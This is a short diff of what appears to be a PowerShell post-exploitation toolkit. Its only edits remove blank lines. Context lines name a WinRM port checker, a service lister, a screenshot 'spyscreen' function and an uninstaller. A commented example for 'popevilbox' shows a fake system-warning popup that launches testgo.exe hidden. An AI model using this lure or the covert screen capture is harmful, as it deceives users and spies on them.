@@ -142,7 +142,6 @@ $checkpsremote = "localhost"; $porty = 5985, 5986; foreach ($port in $porty) { T
 Export-ModuleMember -Function checkpsrem
 Set-Alias -Name checkpsrem -Value checkpsrem
 
-
 Function getservice {
 Get-WmiObject Win32_Service | Where-Object { $_.State -eq 'Running' } | Select-Object Name, ProcessId, StartMode, Status, DisplayName, ServiceType  | Format-Table -AutoSize
 }
@@ -381,7 +380,6 @@ Remove-Item -Path $screenshotPath -Force -ErrorAction SilentlyContinue
 Export-ModuleMember -Function process-spyscreen 
 Set-Alias -Name process-spyscreen -Value process-spyscreen
 
-
 function uninstaller {
     [CmdletBinding()]
     param (
@@ -453,7 +451,6 @@ function uninstaller {
 }
 Export-ModuleMember -Function uninstaller
 Set-Alias -Name uninstaller -Value uninstaller -Description "Run code for uninstaller"
-
 
 #popevilbox -Text "Check your system" -Header "@NT-SYSTEM: Warning!!" -What "powershell start-process .\testgo.exe -windowstyle hidden"
 function popevilbox {
